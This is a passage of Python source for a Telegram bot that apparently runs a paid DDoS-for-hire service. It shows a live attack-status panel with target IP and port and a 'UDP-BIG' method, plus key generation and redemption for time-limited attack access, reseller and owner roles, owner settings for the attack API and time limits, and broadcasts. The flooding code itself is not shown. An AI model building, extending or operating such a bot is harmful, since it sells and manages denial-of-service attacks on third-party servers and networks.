def cmd_status(msg):
    if check_ban(msg): return
    uid = msg.from_user.id
    cid = msg.chat.id

    try:
        status_msg = bot.send_message(cid, "📊 ʟᴏᴀᴅɪɴɢ...")
    except Exception as e:
        print(f"Status send error: {e}")
        return

    def build_status():
        try:
            now = datetime.now()
            with attack_lock:
                running = [(a, dict(atk)) for a, atk in active_attacks.items() if atk['end_time'] > now]

            uptime = str(datetime.now() - BOT_START_TIME).split('.')[0]
            total_users = len(data.get('users', {}))
            total_attacks = len(data.get('attack_logs', []))
            total_keys = len(data.get('keys', {}))
            total_stickers = len(data.get('stickers', []))
            total_videos = len(data.get('videos', []))
            total_pyf = len(data.get('pyf_videos', []))
            total_banned = len(data.get('banned_users', {}))
            user_attacks = data['users'].get(str(uid), {}).get('total_attacks', 0)
            time_left = time_remaining(uid)
            role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")

            txt = ""

            if running:
                atk = running[0][1]
                atk_start = atk.get('start_time', now)
                rem = max(0, int((atk['end_time'] - now).total_seconds()))
                dur = atk.get('duration', 60)
                elapsed = dur - rem
                pct = min(100, int((elapsed / dur) * 100)) if dur > 0 else 0
                filled = int(pct / 10)
                bar = "▰" * filled + "▱" * (10 - filled)

                if pct < 20: st = "🔴 ᴊᴜꜱᴛ ꜱᴛᴀʀᴛᴇᴅ"
                elif pct < 50: st = "🟠 ɪɴ ᴘʀᴏɢʀᴇꜱꜱ"
                elif pct < 80: st = "🟡 ᴍᴏʀᴇ ᴛʜᴀɴ ʜᴀʟꜰ"
                elif pct < 100: st = "🟢 ᴀʟᴍᴏꜱᴛ ᴅᴏɴᴇ"
                else: st = "✅ ᴄᴏᴍᴘʟᴇᴛᴇ"

                target = escape_html(f"{atk.get('target', 'N/A')}:{atk.get('port', 'N/A')}")
                uname = escape_html(atk.get('username', 'Unknown'))
                rem_m = rem // 60
                rem_s = rem % 60
                el_m = elapsed // 60
                el_s = elapsed % 60

                txt += (
                    "▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜\n"
                    "▌   🎯 𝗟𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦   ▐\n"
                    "▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟\n\n"
                    f"{bar} {pct}%\n"
                    f"{st}\n\n"
                    "╭━━━━━━━━━━━━━━━━━━━━╮\n"
                    "┃  ⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
                    "╰━━━━━━━━━━━━━━━━━━━━╯\n"
                    f"┣ 🎯 ᴛᴀʀɢᴇᴛ ➪ <code>{target}</code>\n"
                    f"┣ ▶️ ꜱᴛᴀʀᴛ ➪ <code>{ist_time_str(atk_start)} IST</code>\n"
                    f"┣ ⏹️ ᴇɴᴅ ➪ <code>{ist_time_str(atk['end_time'])} IST</code>\n"
                    f"┣ ⏳ ᴇʟᴀᴘꜱᴇᴅ ➪ <b>{el_m}ᴍ {el_s}ꜱ</b>\n"
                    f"┣ ⏱️ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{rem_m}ᴍ {rem_s}ꜱ</b>\n"
                    f"┗ 👤 ᴜꜱᴇʀ ➪ <b>@{uname}</b>\n\n"
                )

            method = escape_html(get_setting('api_method', 'UDP-BIG'))
            geo = escape_html(get_setting('api_geolocation', 'ALL'))
            uptime_esc = escape_html(uptime)

            txt += (
                "╔══════════════════════════╗\n"
                "║   📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗨𝗦 📊   ║\n"
                "╚══════════════════════════╝\n\n"
                "╭━━━━━━━━━━━━━━━━━━━━╮\n"
                "┃  🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢\n"
                "╰━━━━━━━━━━━━━━━━━━━━╯\n"
                f"┣ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ 🟢 <b>ᴏɴʟɪɴᴇ</b>\n"
                f"┣ ⏱️ ᴜᴘᴛɪᴍᴇ ➪ <b>{uptime_esc}</b>\n"
                f"┣ 🎯 ᴍᴇᴛʜᴏᴅ ➪ <code>{method}</code>\n"
                f"┗ 🌍 ɢᴇᴏ ➪ <code>{geo}</code>\n\n"
                "╭━━━━━━━━━━━━━━━━━━━━╮\n"
                "┃  📈 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦\n"
                "╰━━━━━━━━━━━━━━━━━━━━╯\n"
                f"┣ 👥 ᴜꜱᴇʀꜱ ➪ <b>{total_users}</b>\n"
                f"┣ 🔑 ᴋᴇʏꜱ ➪ <b>{total_keys}</b>\n"
                f"┣ 💀 ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{total_attacks}</b>\n"
                f"┣ 🚫 ʙᴀɴɴᴇᴅ ➪ <b>{total_banned}</b>\n"
                f"┣ ❄ ꜱᴛɪᴄᴋᴇʀꜱ ➪ <b>{total_stickers}</b>\n"
                f"┣ 📹 ᴠɪᴅᴇᴏꜱ ➪ <b>{total_videos}</b>\n"
                f"┗ 🎬 ᴘʏꜰ ➪ <b>{total_pyf}</b>\n\n"
                "╭━━━━━━━━━━━━━━━━━━━━╮\n"
                "┃  👤 𝗬𝗢𝗨𝗥 𝗜𝗡𝗙𝗢\n"
                "╰━━━━━━━━━━━━━━━━━━━━╯\n"
                f"┣ 🎭 ʀᴏʟᴇ ➪ {role}\n"
                f"┣ 🎯 ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{user_attacks}</b>\n"
                f"┗ ⏰ ᴛɪᴍᴇ ➪ <b>{time_left}</b>\n\n"
                "╔══════════════════════════╗\n"
                "║   🔥 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗔𝗧𝗧𝗔𝗖𝗞 🔥   ║\n"
                "╚══════════════════════════╝"
            )
            return txt
        except Exception as e:
            print(f"Build Status Error: {e}")
            return "⚠️ <b>ꜱᴛᴀᴛᴜꜱ ʟᴏᴀᴅ ᴇʀʀᴏʀ</b>"

    try:
        bot.edit_message_text(
            chat_id=cid, message_id=status_msg.message_id,
            text=build_status(), parse_mode="HTML"
        )
    except Exception as e:
        print(f"Status First Edit Error: {e}")

    def auto_update():
        last_text = None
        for _ in range(400):
            time.sleep(3)
            try:
                new_text = build_status()
                if new_text != last_text:
                    bot.edit_message_text(
                        chat_id=cid, message_id=status_msg.message_id,
                        text=new_text, parse_mode="HTML"
                    )
                    last_text = new_text
            except Exception as e:
                err = str(e)
                if "message is not modified" in err.lower(): continue
                if "Too Many Requests" in err or "retry after" in err.lower():
                    time.sleep(5); continue
                break

    threading.Thread(target=auto_update, daemon=True).start()

# ============= LIVE PROFILE =============
@bot.message_handler(commands=['profile'])
def cmd_profile(msg):
    if check_ban(msg): return
    uid = msg.from_user.id
    cid = msg.chat.id

    try:
        profile_msg = bot.send_message(cid, "👤 ʟᴏᴀᴅɪɴɢ ᴘʀᴏꜰɪʟᴇ...")
    except Exception as e:
        print(f"Profile send error: {e}")
        return

    def build_profile():
        try:
            now = datetime.now()
            u = data["users"].get(str(uid), {})
            role = "👑 ᴏᴡɴᴇʀ" if is_owner(uid) else ("💼 ʀᴇꜱᴇʟʟᴇʀ" if is_reseller(uid) else "👤 ᴜꜱᴇʀ")
            time_left = time_remaining(uid)
            time_detail = time_remaining_long(uid)
            
            expiry_date = "N/A"
            if u.get('key_expiry'):
                try:
                    dt = datetime.fromisoformat(u['key_expiry'])
                    expiry_date = dt.strftime('%d %b %Y, %I:%M:%S %p')
                except: pass
            
            joined_full = "N/A"
            account_age = "N/A"
            if u.get('joined_at'):
                try:
                    dt = datetime.fromisoformat(u['joined_at'])
                    joined_full = dt.strftime('%d %b %Y, %I:%M:%S %p')
                    delta = now - dt
                    total_sec = int(delta.total_seconds())
                    days = total_sec // 86400
                    hrs = (total_sec % 86400) // 3600
                    mins = (total_sec % 3600) // 60
                    secs = total_sec % 60
                    parts = []
                    if days > 0: parts.append(f"{days}ᴅ")
                    if hrs > 0: parts.append(f"{hrs}ʜ")
                    if mins > 0: parts.append(f"{mins}ᴍ")
                    parts.append(f"{secs}ꜱ")
                    account_age = " ".join(parts)
                except: pass
            
            total_atk = u.get('total_attacks', 0)
            username_display = msg.from_user.username or "N/A"
            first_name = msg.from_user.first_name or "User"
            
            is_active = has_valid_key(uid)
            status_icon = "🟢 ᴀᴄᴛɪᴠᴇ" if is_active else "🔴 ɪɴᴀᴄᴛɪᴠᴇ"
            
            txt = (
                "╔══════════════════════════════╗\n"
                "║   👤 𝗬𝗢𝗨𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 👤   ║\n"
                "╚══════════════════════════════╝\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   📋 𝗕𝗔𝗦𝗜𝗖 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 📋\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"┣ 🆔 ɪᴅ ➪ <code>{uid}</code>\n"
                f"┣ 📛 ɴᴀᴍᴇ ➪ <b>{escape_html(first_name)}</b>\n"
                f"┣ 🔗 ᴜꜱᴇʀɴᴀᴍᴇ ➪ @{escape_html(username_display)}\n"
                f"┣ 🎭 ʀᴏʟᴇ ➪ {role}\n"
                f"┗ ⚡ ꜱᴛᴀᴛᴜꜱ ➪ {status_icon}\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   ⏰ 𝗧𝗜𝗠𝗘 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 ⏰\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"┣ ⏳ ᴛᴏᴛᴀʟ ➪ <b>{time_left}</b>\n"
                f"{time_detail}\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   📅 𝗞𝗘𝗬 𝗜𝗡𝗙𝗢 📅\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"┣ 📆 ᴇxᴘɪʀᴇꜱ ➪ <code>{expiry_date}</code>\n"
                f"┗ 📥 ᴊᴏɪɴᴇᴅ ➪ <code>{joined_full}</code>\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   📊 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦 📊\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                f"┣ 💀 ᴀᴛᴛᴀᴄᴋꜱ ➪ <b>{total_atk}</b>\n"
                f"┗ 🕐 ᴀᴄᴄᴛ ᴀɢᴇ ➪ <b>{account_age}</b>\n\n"
                f"🕐 <b>ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ:</b> <code>{ist_full_str()} IST</code>\n\n"
            )
            
            if is_active:
                txt += (
                    "╔══════════════════════════════╗\n"
                    "║   ✅ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗔𝗖𝗧𝗜𝗩𝗘 ✅   ║\n"
                    "╚══════════════════════════════╝\n"
                    "┗➤ ᴀᴀᴘ ᴀᴛᴛᴀᴄᴋ ᴋᴀʀ ꜱᴀᴋᴛᴇ ʜᴏ 🔥"
                )
            else:
                txt += (
                    "╔══════════════════════════════╗\n"
                    "║   ❌ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 ❌   ║\n"
                    "╚══════════════════════════════╝\n"
                    "┗➤ ᴋᴇʏ ʀᴇᴅᴇᴇᴍ ᴋᴀʀᴏ: <code>/redeem KEY</code>"
                )
            
            return txt
        except Exception as e:
            print(f"Build Profile Error: {e}")
            return "⚠️ <b>ᴘʀᴏꜰɪʟᴇ ʟᴏᴀᴅ ᴇʀʀᴏʀ</b>"

    try:
        bot.edit_message_text(
            chat_id=cid, message_id=profile_msg.message_id,
            text=build_profile(), parse_mode="HTML"
        )
    except Exception as e:
        print(f"Profile First Edit Error: {e}")

    def auto_update_profile():
        last_text = None
        for _ in range(400):
            time.sleep(3)
            try:
                new_text = build_profile()
                if new_text != last_text:
                    bot.edit_message_text(
                        chat_id=cid, message_id=profile_msg.message_id,
                        text=new_text, parse_mode="HTML"
                    )
                    last_text = new_text
            except Exception as e:
                err = str(e)
                if "message is not modified" in err.lower(): continue
                if "Too Many Requests" in err or "retry after" in err.lower():
                    time.sleep(5); continue
                break

    threading.Thread(target=auto_update_profile, daemon=True).start()

# ============= KEY SYSTEM =============
def parse_duration(text):
    text = text.lower().strip()
    word_map = {
        "second": 1, "seconds": 1, "sec": 1, "s": 1,
        "minute": 60, "minutes": 60, "min": 60, "m": 60,
        "hour": 3600, "hours": 3600, "hr": 3600, "h": 3600,
        "day": 86400, "days": 86400, "d": 86400,
        "week": 604800, "weeks": 604800, "w": 604800,
        "month": 2592000, "months": 2592000, "mo": 2592000,
        "year": 31536000, "years": 31536000, "y": 31536000,
    }
    m = re.match(r'^(\d+)\s*([a-z]+)$', text)
    if m:
        num = int(m.group(1)); suf = m.group(2)
        if suf in word_map: return num * word_map[suf]
        return None
    if text.isdigit(): return int(text) * 86400
    if text in word_map: return word_map[text]
    return None

def human_readable(seconds):
    if seconds >= 31536000 and seconds % 31536000 == 0: return f"{seconds // 31536000} ʏᴇᴀʀ"
    if seconds >= 2592000 and seconds % 2592000 == 0: return f"{seconds // 2592000} ᴍᴏɴᴛʜ"
    if seconds >= 604800 and seconds % 604800 == 0: return f"{seconds // 604800} ᴡᴇᴇᴋ"
    if seconds >= 86400 and seconds % 86400 == 0: return f"{seconds // 86400} ᴅᴀʏ"
    if seconds >= 3600 and seconds % 3600 == 0: return f"{seconds // 3600} ʜᴏᴜʀ"
    if seconds >= 60 and seconds % 60 == 0: return f"{seconds // 60} ᴍɪɴᴜᴛᴇ"
    return f"{seconds} ꜱᴇᴄᴏɴᴅ"

@bot.message_handler(commands=['genkey', 'gen'])
def cmd_gen(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        txt = (
            "╔══════════════════════════════╗\n"
            "║   🔑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗞𝗘𝗬 𝗠𝗔𝗞𝗘𝗥 🔑   ║\n"
            "╚══════════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   💎 𝗚𝗘𝗡𝗞𝗘𝗬 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💎\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            "📝 <b>ꜰᴏʀᴍᴀᴛ:</b>\n"
            "<code>/genkey DURATION [AMOUNT] [NAME]</code>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   ⏰ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗢𝗣𝗧𝗜𝗢𝗡𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            "⚡ <b>ꜱᴇᴄᴏɴᴅꜱ</b>  ➪  <code>10s</code>  <code>60s</code>\n"
            "⏱️ <b>ᴍɪɴᴜᴛᴇꜱ</b>  ➪  <code>30m</code>  <code>45m</code>\n"
            "🕐 <b>ʜᴏᴜʀꜱ</b>     ➪  <code>1h</code>  <code>12h</code>\n"
            "📅 <b>ᴅᴀʏꜱ</b>      ➪  <code>1d</code>  <code>7d</code>  <code>30d</code>\n"
            "🗓️ <b>ᴡᴇᴇᴋꜱ</b>    ➪  <code>1week</code>\n"
            "🌙 <b>ᴍᴏɴᴛʜꜱ</b>   ➪  <code>1month</code>\n"
            "🎆 <b>ʏᴇᴀʀꜱ</b>     ➪  <code>1year</code>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   ✨ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗘𝗫𝗔𝗠𝗣𝗟𝗘𝗦 ✨\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            "🔸 <code>/genkey 1d 5</code>\n"
            "🔸 <code>/genkey 1month 10 VIP</code>\n"
            "🔸 <code>/genkey 30m 1 TEST</code>\n\n"
            "╔══════════════════════════════╗\n"
            "║   💠 𝗖𝗨𝗦𝗧𝗢𝗠 𝗡𝗔𝗠𝗘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 💠   ║\n"
            "╚══════════════════════════════╝"
        )
        bot.reply_to(msg, txt, parse_mode="HTML")
        return

    duration_str = p[1]
    secs = parse_duration(duration_str)
    if not secs or secs < 1:
        bot.reply_to(msg,
            "❌ <b>ɪɴᴠᴀʟɪᴅ ᴅᴜʀᴀᴛɪᴏɴ!</b>\n\n"
            "✅ <b>ᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛꜱ:</b>\n"
            "┣ <code>1d</code> ➪ 1 ᴅᴀʏ\n"
            "┣ <code>1h</code> ➪ 1 ʜᴏᴜʀ\n"
            "┣ <code>1m</code> ➪ 1 ᴍɪɴᴜᴛᴇ\n"
            "┣ <code>1s</code> ➪ 1 ꜱᴇᴄᴏɴᴅ\n"
            "┗ <code>1month</code> ➪ 1 ᴍᴏɴᴛʜ",
            parse_mode="HTML")
        return

    try:
        amt = int(p[2]) if len(p) > 2 else 1
        custom_name = p[3].upper() if len(p) > 3 else None
    except:
        bot.reply_to(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ!</b>", parse_mode="HTML")
        return

    keys = []
    for _ in range(amt):
        if custom_name:
            rp = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
            formatted = f"{custom_name}-{rp[:4]}-{rp[4:8]}-{rp[8:12]}"
        else:
            formatted = fmt_key(gen_key(16))

        data["keys"][formatted] = {
            "seconds": secs,
            "duration_text": human_readable(secs),
            "created_at": datetime.now().isoformat(),
            "used": False,
            "used_by": None
        }
        keys.append(formatted)
    save_data(data)

    dur_text = human_readable(secs)

    txt = (
        "╔══════════════════════════════╗\n"
        "║   ✅ 𝗞𝗘𝗬𝗦 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 ✅   ║\n"
        "╚══════════════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   💎 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗞𝗘𝗬 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 💎\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"🔢 <b>ᴛᴏᴛᴀʟ ᴋᴇʏꜱ:</b>  <code>{amt}</code>\n"
        f"⏰ <b>ᴅᴜʀᴀᴛɪᴏɴ:</b>    <code>{dur_text}</code>\n"
        f"🎭 <b>ᴛʏᴘᴇ:</b>        <code>{'ᴘʀᴇᴍɪᴜᴍ' if custom_name else 'ꜱᴛᴀɴᴅᴀʀᴅ'}</code>\n"
    )
    if custom_name:
        txt += f"🏷️ <b>ɴᴀᴍᴇ ᴛᴀɢ:</b>   <code>{custom_name}</code>\n"

    txt += "\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
    txt += "┃   🔑 𝗬𝗢𝗨𝗥 𝗞𝗘𝗬𝗦 🔑\n"
    txt += "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"

    for i, k in enumerate(keys, 1):
        txt += f"<b>{i:02d}.</b> <code>{k}</code>\n"

    txt += (
        "\n╔══════════════════════════════╗\n"
        "║   💠 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💠   ║\n"
        "╚══════════════════════════════╝\n"
        "┗➤ <code>/redeem KEY</code>\n\n"
        "✨ <i>ᴋᴇʏꜱ ᴄᴏᴘʏ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ᴛᴀᴘ ᴋᴀʀᴏ</i>"
    )

    bot.reply_to(msg, txt, parse_mode="HTML")

@bot.message_handler(commands=['redeem'])
def cmd_redeem(msg):
    if check_ban(msg): return
    uid = msg.from_user.id
    p = msg.text.split()
    if len(p) < 2:
        bot.reply_to(msg,
            "╔══════════════════════════════╗\n"
            "║   🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬 🔑   ║\n"
            "╚══════════════════════════════╝\n\n"
            "📝 <b>ᴜꜱᴀɢᴇ:</b>\n"
            "<code>/redeem YOUR-KEY</code>\n\n"
            "📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
            "<code>/redeem VIP-A1B2-C3D4-E5F6</code>",
            parse_mode="HTML")
        return
    key = p[1].strip().upper()
    if key not in data["keys"]:
        bot.reply_to(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ᴋᴇʏ!</b>", parse_mode="HTML"); return
    kinfo = data["keys"][key]
    if kinfo.get("used"):
        bot.reply_to(msg, "❌ <b>ᴀʟʀᴇᴀᴅʏ ᴜꜱᴇᴅ!</b>", parse_mode="HTML"); return

    secs = kinfo.get("seconds", kinfo.get("days", 30) * 86400)
    expiry = datetime.now() + timedelta(seconds=secs)
    data["users"].setdefault(str(uid), {})
    existing = data["users"][str(uid)].get("key_expiry")
    if existing:
        try:
            old_exp = datetime.fromisoformat(existing)
            if old_exp > datetime.now():
                expiry = old_exp + timedelta(seconds=secs)
        except: pass
    data["users"][str(uid)]["key_expiry"] = expiry.isoformat()
    data["users"][str(uid)]["username"] = msg.from_user.username or msg.from_user.first_name
    kinfo["used"] = True; kinfo["used_by"] = uid
    kinfo["used_at"] = datetime.now().isoformat()
    save_data(data)

    bot.reply_to(msg,
        "╔══════════════════════════════╗\n"
        "║   ✅ 𝗞𝗘𝗬 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 ✅   ║\n"
        "╚══════════════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   🎉 𝗦𝗨𝗖𝗖𝗘𝗦𝗦 🎉\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"┣ ⏰ ᴀᴅᴅᴇᴅ ➪ <b>+{human_readable(secs)}</b>\n"
        f"┣ 📅 ᴇxᴘɪʀᴇꜱ ➪ <b>{expiry.strftime('%d %b %Y %I:%M:%S %p')}</b>\n"
        f"┗ ⏳ ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{time_remaining(uid)}</b>\n\n"
        "╔══════════════════════════════╗\n"
        "║   🔥 𝗘𝗡𝗝𝗢𝗬 𝗔𝗧𝗧𝗔𝗖𝗞𝗦 🔥   ║\n"
        "╚══════════════════════════════╝",
        parse_mode="HTML")

# ============= OWNER PANEL =============
@bot.message_handler(commands=['panel'])
def cmd_panel(msg):
    if not is_owner(msg.from_user.id): return
    bot.reply_to(msg,
        "╔══════════════════════════╗\n"
        "║   👑 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 👑   ║\n"
        "╚══════════════════════════╝\n\n"
        "📋 <b>ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅꜱ:</b>\n\n"
        "👑 /panel ➪ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
        "👥 /users ➪ ᴜꜱᴇʀꜱ ʟɪꜱᴛ\n"
        "📊 /stats ➪ ꜱᴛᴀᴛꜱ\n"
        "📢 /broadcast MSG ➪ ʙʀᴏᴀᴅᴄᴀꜱᴛ\n"
        "🚫 /ban ID REASON ➪ ʙᴀɴ\n"
        "✅ /unban ID ➪ ᴜɴʙᴀɴ\n"
        "🔑 /genkey ➪ ɢᴇɴ ᴋᴇʏꜱ\n"
        "📡 /setapi ➪ ꜱᴇᴛ ᴀᴘɪ\n"
        "🧪 /testapi ➪ ᴛᴇꜱᴛ ᴀᴘɪ\n"
        "⏱️ /setmaxtime SEC ➪ ᴍᴀx ᴛɪᴍᴇ\n"
        "⏸️ /setcooldown SEC ➪ ᴄᴏᴏʟᴅᴏᴡɴ\n"
        "🔧 /maintenance ➪ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ\n"
        "⚙️ /settings ➪ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n"
        "╔══════════════════════════╗\n"
        "║   ⚡ 𝗕𝗢𝗧 𝗢𝗡𝗟𝗜𝗡𝗘 ⚡   ║\n"
        "╚══════════════════════════╝",
        parse_mode="HTML")

@bot.message_handler(commands=['users'])
def cmd_users(msg):
    if not is_owner(msg.from_user.id): return
    if not data["users"]:
        bot.reply_to(msg, "📂 <b>ɴᴏ ᴜꜱᴇʀꜱ.</b>", parse_mode="HTML"); return
    txt = "╔══════════════════════════╗\n║   👥 𝗨𝗦𝗘𝗥𝗦 𝗟𝗜𝗦𝗧 👥   ║\n╚══════════════════════════╝\n\n"
    for i, (u_id, u) in enumerate(list(data["users"].items())[:50], 1):
        txt += f"{i}. <code>{u_id}</code> ➪ {u.get('total_attacks', 0)} ᴀᴛᴛᴀᴄᴋꜱ\n"
    txt += f"\n━━━━━━━━━━━━━━━━━━━━━\n🔹 ᴛᴏᴛᴀʟ: <b>{len(data['users'])}</b>"
    bot.reply_to(msg, txt, parse_mode="HTML")

# ============= PREMIUM BROADCAST =============
@bot.message_handler(commands=['broadcast'])
def cmd_broadcast(msg):
    if not is_owner(msg.from_user.id): return
    p = msg.text.split(maxsplit=1)
    if len(p) < 2:
        txt = (
            "╔══════════════════════════════╗\n"
            "║   📢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 📢   ║\n"
            "╚══════════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   💎 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 💎\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            "📝 <b>ꜰᴏʀᴍᴀᴛ:</b>\n"
            "<code>/broadcast YOUR MESSAGE</code>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   ✨ 𝗘𝗫𝗔𝗠𝗣𝗟𝗘𝗦 ✨\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            "🔸 <code>/broadcast Bot update ho gaya!</code>\n\n"
            "🔸 <code>/broadcast New keys available</code>\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   📊 𝗜𝗡𝗙𝗢 📊\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"👥 <b>ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ:</b> <code>{len(data['users'])}</code>\n"
            f"🚫 <b>ʙᴀɴɴᴇᴅ:</b> <code>{len(data.get('banned_users', {}))}</code>\n\n"
            "╔══════════════════════════════╗\n"
            "║   💠 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 💠   ║\n"
            "╚══════════════════════════════╝"
        )
        bot.reply_to(msg, txt, parse_mode="HTML")
        return

    text = p[1]
    total = len(data["users"])
    sent = 0
    failed = 0
    banned_skip = 0

    broadcast_header = (
        "╔══════════════════════════════╗\n"
        "║   📢 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗔𝗡𝗡𝗢𝗨𝗡𝗖𝗘𝗠𝗘𝗡𝗧 📢   ║\n"
        "╚══════════════════════════════╝\n\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   💎 𝗙𝗥𝗢𝗠 𝗢𝗪𝗡𝗘𝗥 💎\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
    )
    broadcast_footer = (
        "\n\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   ⚡ 𝗕𝗢𝗧 𝗧𝗘𝗔𝗠 ⚡\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        f"┣ 👑 ᴏᴡɴᴇʀ ɪᴅ ➪ <code>{BOT_OWNER}</code>\n"
        f"┗ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n\n"
        "╔══════════════════════════════╗\n"
        "║   🔥 𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗨𝗦𝗜𝗡𝗚 🔥   ║\n"
        "╚══════════════════════════════╝"
    )

    full_message = broadcast_header + text + broadcast_footer

    status_msg = bot.reply_to(msg,
        "╔══════════════════════════════╗\n"
        "║   📤 𝗦𝗘𝗡𝗗𝗜𝗡𝗚 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 📤   ║\n"
        "╚══════════════════════════════╝\n\n"
        f"┣ 👥 ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ ➪ <b>{total}</b>\n"
        f"┣ ✅ ꜱᴇɴᴛ ➪ <b>0</b>\n"
        f"┣ ❌ ꜰᴀɪʟᴇᴅ ➪ <b>0</b>\n"
        f"┗ 🚫 ʙᴀɴɴᴇᴅ ꜱᴋɪᴘ ➪ <b>0</b>\n\n"
        "⏳ <i>ᴘʀᴏᴄᴇꜱꜱɪɴɢ...</i>",
        parse_mode="HTML")

    def do_broadcast():
        nonlocal sent, failed, banned_skip
        for i, uid_str in enumerate(list(data["users"].keys()), 1):
            if uid_str in data.get("banned_users", {}):
